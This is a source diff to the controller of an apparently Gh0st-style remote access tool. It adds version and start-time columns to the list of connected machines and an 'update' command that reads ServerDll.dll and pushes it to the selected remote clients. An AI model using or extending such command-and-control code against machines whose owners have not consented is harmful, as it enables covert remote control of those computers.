@@ -39,7 +39,10 @@ enum
 	ONLINELIST_OS,            //操作系统
 	ONLINELIST_CPU,           //CPU
 	ONLINELIST_VIDEO,         //摄像头(有无)
-	ONLINELIST_PING           //PING(对方的网速)
+	ONLINELIST_PING,           //PING(对方的网速)
+	ONLINELIST_VERSION,	       // 版本信息
+	ONLINELIST_LOGINTIME,      // 启动时间
+	ONLINELIST_MAX, 
 };
 
 
@@ -49,7 +52,7 @@ typedef struct
 	int		nWidth;            //列表的宽度
 }COLUMNSTRUCT;
 
-const int  g_Column_Count_Online  = 7; // 报表的列数
+const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数
 
 COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
 {
@@ -60,6 +63,8 @@ COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] =
 	{"CPU",				80	},
 	{"摄像头",			72	},
 	{"PING",			100	},
+	{"版本",			80	},
+	{"启动时间",		180 },
 };
 
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
@@ -120,7 +125,8 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 
 	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
-	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);
+	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
+	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
 
 	InitializeCriticalSection(&m_cs);
 }
@@ -148,6 +154,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
 	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
 	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
+	ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
 	ON_COMMAND(IDM_ONLINE_ABOUT,&CMy2015RemoteDlg::OnAbout)
 
 	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
@@ -322,7 +329,7 @@ VOID CMy2015RemoteDlg::TestOnline()
 
 
 VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
-							   CString strCPU, CString strVideo, CString strPing,CONTEXT_OBJECT* ContextObject)
+							   CString strCPU, CString strVideo, CString strPing, CString ver, CString st, CONTEXT_OBJECT* ContextObject)
 {
 	EnterCriticalSection(&m_cs);
 	//默认为0行  这样所有插入的新列都在最上面
@@ -334,6 +341,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	m_CList_Online.SetItemText(i,ONLINELIST_CPU,strCPU);
 	m_CList_Online.SetItemText(i,ONLINELIST_VIDEO,strVideo);
 	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 
+	m_CList_Online.SetItemText(i, ONLINELIST_VERSION, ver);
+	m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, st);
 
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
 
@@ -624,7 +633,8 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	}
 
 	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
-	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
 	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
 
 	*pResult = 0;
@@ -637,6 +647,56 @@ void CMy2015RemoteDlg::OnOnlineMessage()
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
+char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
+	fileSize = 0;
+	try {
+		// 打开文件（只读模式）
+		CFile file(filePath, CFile::modeRead | CFile::typeBinary);
+
+		// 获取文件大小
+		fileSize = file.GetLength();
+
+		// 分配内存缓冲区: 头+文件大小+文件内容
+		char* buffer = new char[1 + sizeof(ULONGLONG) + static_cast<size_t>(fileSize) + 1];
+		if (!buffer) {
+			return NULL;
+		}
+		memcpy(buffer+1, &fileSize, sizeof(ULONGLONG));
+		// 读取文件内容到缓冲区
+		file.Read(buffer + 1 + sizeof(ULONGLONG), static_cast<UINT>(fileSize));
+		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // 添加字符串结束符
+
+		// 释放内存
+		return buffer;
+	}
+	catch (CFileException* e) {
+		// 捕获文件异常
+		TCHAR errorMessage[256];
+		e->GetErrorMessage(errorMessage, 256);
+		e->Delete();
+		return NULL;
+	}
+
+}
+
+void CMy2015RemoteDlg::OnOnlineUpdate()
+{
+	char path[_MAX_PATH], * p = path;
+	GetModuleFileNameA(NULL, path, sizeof(path));
+	while (*p) ++p;
+	while ('\\' != *p) --p;
+	strcpy(p + 1, "ServerDll.dll");
+	ULONGLONG fileSize = 0;
+	char *buffer = ReadFileToMemory(path, fileSize);
+	if (buffer) {
+		buffer[0] = COMMAND_UPDATE;
+		SendSelectedCommand((PBYTE)buffer, 1 + sizeof(ULONGLONG) + fileSize + 1);
+		delete[] buffer;
+	}
+	else {
+		AfxMessageBox("读取文件失败: "+ CString(path));
+	}
+}
 
 void CMy2015RemoteDlg::OnOnlineDelete()
 {
@@ -975,20 +1035,23 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 	CString	strToolTipsText;
 	try
 	{
-		// 不合法的数据包
-		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
-		{
-			return -1;
-		}
-
-		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
-		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);
 
 		sockaddr_in  ClientAddr;
 		memset(&ClientAddr, 0, sizeof(ClientAddr));
 		int iClientAddrLen = sizeof(sockaddr_in);
 		SOCKET nSocket = ContextObject->sClientSocket;
-		BOOL bOk = getpeername(nSocket,(SOCKADDR*)&ClientAddr, &iClientAddrLen);  //IP C   <---IP
+		BOOL bOk = getpeername(nSocket, (SOCKADDR*)&ClientAddr, &iClientAddrLen);
+		// 不合法的数据包
+		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
+		{
+			char buf[100];
+			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", inet_ntoa(ClientAddr.sin_addr));
+			OutputDebugStringA(buf);
+			return -1;
+		}
+
+		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
+		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);
 
 		strIP = inet_ntoa(ClientAddr.sin_addr);
 
@@ -1008,7 +1071,7 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 
 		strAddr.Format("%d", nSocket);
 
-		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,ContextObject);
+		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime,ContextObject);
 		delete LoginInfor;
 		return S_OK;
 	}catch(...){
